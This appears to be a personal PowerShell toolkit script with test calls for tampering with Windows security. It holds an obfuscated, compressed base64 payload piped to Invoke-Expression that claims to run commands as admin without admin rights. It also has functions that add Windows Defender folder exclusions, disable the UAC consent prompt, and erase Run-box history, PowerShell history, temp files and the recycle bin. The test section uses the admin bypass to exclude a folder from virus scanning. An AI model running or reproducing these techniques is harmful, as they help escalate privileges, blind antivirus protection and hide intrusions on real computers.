# Shows the folders windows defender won't check for viruses - Please note that this one runs only as an admin, (when trying using the bypass_admin hack it won't show the results as it swallos the stdout)
function show_folders_excluded_from_windows_defender {
  Get-MpPreference | select Exclusion* | fl
}

# Excludes the folder from the wondows defender real time virus check
function exclude_folder_from_windows_defender {
  Param([string]$folder_to_exclude)

  Add-MpPreference -ExclusionPath $folder_to_exclude
}

function remove_windows_defender_folder_exclusion {
  Param([string]$folder_to_remove_exclusion)

  Remove-MpPreference -ExclusionPath "$folder_to_remove_exclusion"
}

# Encode text to base64
function encode_to_base64 {
  param ([string]$text_to_encode)

  return [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($text_to_encode))
}

# Decode from base64 to text
function decode_from_base64 {
  param ([string]$text_to_decode)

  return [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($text_to_decode))
}

# Running powershell script as ADMIN (without being Admin) (Base64 script should be in a $code variable)
function bypass_admin {
  [CmdletBinding()] param ([Parameter (Position=0, Mandatory = $True)] [string]$run_command )
  
  $code=encode_to_base64($run_command)
  (nEw-OBJECt  Io.CoMpreSsion.DEflateSTrEaM( [SyStem.io.memoRYSTReaM][convErT]::fromBaSE64STriNg( 'hY49C8IwGIT/ykvoGjs4FheLqIgfUHTKEpprK+SLJFL99zYFwUmXm+6ee4rzcbti3o0IcYDWCzxBfKSB+Mldctg98c0TLa1fXsZIHLalonUKxKqAnqRSxHaH+ioa16VRBohaT01EsXCmF03mirOHFa0zRlrFqFRUTM9Udv8QJvKIlO62j6J+hBvCvGYZzfK+c2o68AhZvWqSDIk3GvDEIy1nvIJGwk9J9lH53f22mSdv') ,[SysTEM.io.COMpResSion.coMPRESSIONMoDE]::DeCompress ) | ForeacH{nEw-OBJECt Io.StReaMrEaDer( $_,[SySTEM.teXT.enCOdING]::aSciI )}).rEaDTOEnd( ) | InVoKE-expREssION
}

# Cleans the computer from any leftovers
function clean_computer {
  # delete run box history
  REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

  # Delete powershell history -- NOT SURE THIS WORKS :-(
  Remove-Item (Get-PSReadlineOption).HistorySavePath

  # empty temp folder
  rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

  # Empty recycle bin
  Clear-RecycleBin -Force -ErrorAction SilentlyContinue
}

# This one works when in Admin mode, to revert the changes, set the value back to 5
function disable_uac_prompt {
  Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
}

# Setting the keyboard layout to English only
function set_keyboard_layout_to_english_only {
  Set-WinUserLanguageList -LanguageList en-US -force;
}

# Adding an additional keyboard layout (he-IL?)
function add_keyboard_layout {
  Param([string]$keyboard_layout)

  $new_keyboard_layouts = Get-WinUserLanguageList
  $new_keyboard_layouts.Add($keyboard_layout)
  Set-WinUserLanguageList $new_keyboard_layouts -Force
}

## KEYBOARD LAYOUTS TESTS ##
echo "Setting keyboard layout to English only!"
set_keyboard_layout_to_english_only
Pause
echo "Adding the hebrew Keyboard layout"
add_keyboard_layout "he-IL"

## ADMIN BYPASSING TESTS ##
echo "This won't work and it will output that it needs admin permissions"
Add-MpPreference -ExclusionPath "C:\Users\Hayun\3"
echo . ; echo "Now it should work"
bypass_admin 'Add-MpPreference -ExclusionPath "C:\Users\Hayun\3"'
echo . ; echo .

## BASE64 ENCODING/DECODING TESTS ##
$encoded = encode_to_base64 'Hello Base64'
$decoded = decode_from_base64($encoded)
echo "Encoded as: $encoded"
echo "Decoded as: $decoded"

## WINDOWS DEFENDER FOLDER EXCLUSION TESTS ##
# When running the powershell as Admin, the following will work
echo . ; echo .
echo "Current folders excluded from Windows defender live virus monitoring"
show_folders_excluded_from_windows_defender
echo . ; echo .
echo "Adding C:\excluded to the exlusion list"
mkdir C:\excluded
exclude_folder_from_windows_defender 'c:\excluded'
show_folders_excluded_from_windows_defender
echo . ; echo . 
echo "Removing the folder from exclusion"
remove_windows_defender_folder_exclusion 'c:\excluded'
show_folders_excluded_from_windows_defender
